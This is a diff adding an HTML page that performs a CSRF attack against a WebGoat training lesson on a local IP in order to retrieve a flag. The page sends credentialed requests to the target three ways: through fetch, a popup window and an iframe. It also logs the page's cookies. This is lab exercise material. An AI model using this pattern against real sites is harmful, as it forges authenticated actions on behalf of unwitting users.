@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Get Flag (IMPROVED)</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #333;
+            margin-top: 0;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 15px;
+        }
+        .alert {
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border-left: 5px solid;
+        }
+        .alert-info { background: #e3f2fd; border-color: #2196F3; color: #0d47a1; }
+        .alert-warning { background: #fff3e0; border-color: #ff9800; color: #e65100; }
+        .alert-success { background: #e8f5e9; border-color: #4caf50; color: #1b5e20; }
+        .alert-danger { background: #ffebee; border-color: #f44336; color: #b71c1c; }
+        
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 10px 5px;
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        #result {
+            margin-top: 25px;
+            padding: 20px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            display: none;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        .flag-box {
+            background: #4caf50;
+            color: white;
+            padding: 25px;
+            border-radius: 10px;
+            font-size: 28px;
+            font-weight: bold;
+            text-align: center;
+            margin: 20px 0;
+            display: none;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        code {
+            background: #e8eaf6;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #5e35b1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 CSRF Attack - Get Flag (IMPROVED)</h1>
+        
+        <div class="alert alert-warning">
+            <strong>⚠️ IMPORTANT:</strong> You MUST be logged into WebGoat at 
+            <code>http://192.168.254.112:8001</code> in THIS SAME BROWSER!
+        </div>
+
+        <div class="alert alert-info">
+            <strong>📝 Instructions:</strong><br>
+            Click one of the buttons below to trigger the CSRF attack. 
+            The flag will appear on this page if successful.
+        </div>
+
+        <button onclick="method1()" style="font-size: 18px;">🚀 GET THE FLAG (Click Here!)</button>
+        <button onclick="method2()">📄 Method 2: Open in New Window</button>
+        <button onclick="method3()">🖼️ Method 3: Use Iframe</button>
+
+        <div id="flag-display" class="flag-box"></div>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        const TARGET = 'http://192.168.254.112:8001/WebGoat/csrf/basic-get-flag';
+        
+        function showResult(msg, success = false) {
+            const div = document.getElementById('result');
+            div.style.display = 'block';
+            div.style.background = success ? '#e8f5e9' : '#ffebee';
+            div.style.color = success ? '#1b5e20' : '#b71c1c';
+            div.textContent = msg;
+        }
+
+        function showFlag(flag) {
+            const flagDiv = document.getElementById('flag-display');
+            flagDiv.style.display = 'block';
+            flagDiv.innerHTML = `🎉 FLAG: <span style="background: rgba(0,0,0,0.2); padding: 10px 20px; border-radius: 5px; font-family: monospace;">${flag}</span>`;
+        }
+
+        async function method1() {
+            showResult('⏳ Sending CSRF request...\n\nPlease wait...');
+            
+            try {
+                console.log('Fetching from:', TARGET);
+                
+                const response = await fetch(TARGET, {
+                    method: 'GET',
+                    credentials: 'include',
+                    mode: 'cors',
+                    cache: 'no-cache'
+                });
+                
+                console.log('Response Status:', response.status);
+                console.log('Response OK:', response.ok);
+                
+                const text = await response.text();
+                console.log('Response Body:', text);
+                
+                // Show raw response
+                showResult(`✅ Response Received!\n\nStatus: ${response.status}\n\nRaw Response:\n${text}`, true);
+                
+                // Try to parse JSON
+                if (text && text.trim()) {
+                    try {
+                        const json = JSON.parse(text);
+                        console.log('Parsed JSON:', json);
+                        
+                        // Check for flag in different possible fields
+                        const flagValue = json.flag || json.Flag || json.FLAG || json.value;
+                        
+                        if (flagValue !== undefined && flagValue !== null) {
+                            showFlag(flagValue);
+                            showResult(`✅ SUCCESS!\n\nFLAG: ${flagValue}\n\nFull Response:\n${JSON.stringify(json, null, 2)}`, true);
+                        } else {
+                            showResult(`✅ Response received, but no flag found.\n\nResponse keys: ${Object.keys(json).join(', ')}\n\nFull JSON:\n${JSON.stringify(json, null, 2)}`, true);
+                        }
+                    } catch (parseError) {
+                        console.error('JSON Parse Error:', parseError);
+                        showResult(`✅ Response received (not JSON format):\n\n${text}`, true);
+                    }
+                } else {
+                    showResult('❌ Empty response received!', false);
+                }
+                
+            } catch (error) {
+                console.error('Fetch Error:', error);
+                showResult(`❌ ERROR: ${error.message}\n\nTroubleshooting:\n\n1. Are you logged into WebGoat at 192.168.254.112:8001?\n2. Is WebGoat running?\n3. Are you on the CSRF lesson page in WebGoat?\n4. Check browser console (F12) for CORS errors.\n\nIf you see CORS errors, try Method 2 or Method 3 instead!`, false);
+            }
+        }
+
+        function method2() {
+            showResult('📄 Opening URL in new window...\n\nCheck the new window for the flag!', true);
+            const win = window.open(TARGET, '_blank', 'width=800,height=600');
+            if (!win) {
+                showResult('❌ Popup blocked! Please allow popups for this page.', false);
+            }
+        }
+
+        function method3() {
+            showResult('🖼️ Creating iframe...\n\nThe flag should appear below:', true);
+            
+            const existing = document.getElementById('csrf-iframe');
+            if (existing) existing.remove();
+            
+            const iframe = document.createElement('iframe');
+            iframe.id = 'csrf-iframe';
+            iframe.src = TARGET;
+            iframe.style.width = '100%';
+            iframe.style.height = '400px';
+            iframe.style.border = '3px solid #667eea';
+            iframe.style.borderRadius = '8px';
+            iframe.style.marginTop = '20px';
+            iframe.style.background = 'white';
+            
+            document.querySelector('.container').appendChild(iframe);
+        }
+
+        // Debug: Show if we have cookies
+        console.log('Current cookies:', document.cookie);
+        console.log('Target URL:', TARGET);
+    </script>
+</body>
+</html>
